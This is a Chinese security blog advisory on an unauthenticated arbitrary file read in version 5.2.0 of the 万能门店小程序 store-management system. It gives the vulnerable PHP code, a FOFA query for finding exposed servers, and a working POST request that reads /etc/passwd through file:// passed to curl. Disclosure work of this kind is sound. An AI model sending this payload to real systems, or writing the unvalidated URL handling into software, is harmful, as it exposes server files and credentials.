---
title: "万能门店小程序管理系统 /api/wxapps/_Postrequest 文件读取漏洞"
source: https://mrxn.net/jswz/api-wxapps-_Postrequest-fileread.html
asset_dir: assets/万能门店小程序管理系统-apiwxapps_postrequest-文件读取漏洞
---

# 万能门店小程序管理系统 /api/wxapps/\_Postrequest 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/18 18:36
- 826浏览
- [0评论](#comment)
- 23分钟阅读

深入探索

api

身份验证

application

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。该系统集成了会员管理和会员营销两大核心功能，支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统的/api/wxapps/\_Postrequest接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，未经身份验证的攻击者可以通过该漏洞下载服务器任意文件，包括源代码文件、系统敏感文件、配置文件等等。

音频与视频聊天

# 影响版本

万能门店小程序全[开源](#)独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

深入探索

编码转换工具

防火墙软件

Nessus

application/api/controller/Wxapps.php

```
function _Postrequest($url, $data, $ssl = true, $token = '') //0正常， 1头条
    {
        if (!$token) {
            $headers = [
                "Content-type: application/json;charset='utf-8'"
            ];
        } else {

            $headers = [
                "X-Token: " . $token
            ];
        }
        //curl完成
        $curl = curl_init();
        //设置curl选项
        curl_setopt($curl, CURLOPT_URL, $url);//URL
        $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0 FirePHP/0.7.4';
        curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);//user_agent，请求代理信息
        curl_setopt($curl, CURLOPT_AUTOREFERER, true);//referer头，请求来源
        curl_setopt($curl, CURLOPT_TIMEOUT, 30);//设置超时时间
        //SSL相关
        if ($ssl) {
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);//禁用后cURL将终止从服务端进行验证
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);//检查服务器SSL证书中是否存在一个公用名(common name)。
        }
        // 处理post相关选项
        curl_setopt($curl, CURLOPT_POST, true);// 是否为POST请求
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);// 处理请求数据
        // 处理响应结果
        curl_setopt($curl, CURLOPT_HEADER, false);//是否处理响应头
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);//curl_exec()是否返回响应结果
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

        curl_setopt($curl, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        // 发出请求
        $response = curl_exec($curl);
        if (false === $response) {
            echo '<br>', curl_error($curl), '<br>';
            return false;
        }
        curl_close($curl);
        return $response;
    }
```

深入探索

安全

网络安全课程

文件大小转换

`$url` 直接传入 curl 中造成可使用php伪协议造成任意文件读取文件[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /api/wxapps/_Postrequest HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

url=file:///etc/passwd&data=1
```

[![万能门店小程序管理系统 /api/wxapps/_Postrequest 文件读取漏洞](images/img-001-34b8a255a672.webp)](https://image.mrxn.net/580b767a16c147d5815e39a3fac83cd9.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
